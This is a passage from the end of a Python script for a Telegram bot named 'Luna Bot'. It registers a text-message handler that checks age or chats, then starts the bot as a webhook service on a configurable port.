    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat))

    port = int(os.environ.get("PORT", 8080))

    print("🌙 Luna Bot iniciado como Policía...")
    application.run_webhook(
        listen="0.0.0.0",
        port=port,
        url_path=TELEGRAM_TOKEN,
        webhook_url=f"{RENDER_EXTERNAL_URL}/{TELEGRAM_TOKEN}"
    )
